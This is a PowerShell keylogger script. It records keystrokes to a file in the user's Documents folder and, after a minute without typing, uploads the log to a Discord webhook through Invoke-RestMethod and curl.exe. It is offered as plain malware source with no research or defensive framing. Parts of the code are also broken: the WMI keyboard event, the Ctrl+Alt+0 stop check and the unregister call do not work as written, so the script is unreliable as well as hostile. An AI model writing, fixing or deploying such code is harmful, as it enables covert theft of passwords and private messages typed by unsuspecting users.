# Define the log file path
$logFilePath = "$env:USERPROFILE\Documents\keylog.txt"

# Initialize the last keystroke time
$lastKeystrokeTime = [System.DateTime]::Now

# Function to upload data to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $hookurl = "$dc"
    $Body = @{
        'keylog' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Event handler for keypress
$OnKeyPress = {
    param (
        $key
    )
    $now = [System.DateTime]::Now
    $elapsedTime = $now - $lastKeystrokeTime
    $lastKeystrokeTime = $now

    # Log the key
    Add-Content -Path $logFilePath -Value $key

    # If there's no typing activity for 60 seconds, send the content to Discord
    if ($elapsedTime.TotalSeconds -ge 60) {
        $text = Get-Content -Path $logFilePath
        Upload-Discord -text $text
        Clear-Content -Path $logFilePath
    }
}

# Register the keypress event
Register-WmiEvent -Class Win32_Keyboard -Action $OnKeyPress

# Start the script and wait for Ctrl+Alt+0 to stop
Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."

while ($true) {
    $key = [Console]::ReadKey()
    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "0")) {
        # Unregister the event and exit
        Unregister-Event -SourceIdentifier (Get-EventSubscriber -SourceIdentifier "keyPress")
        break
    }
}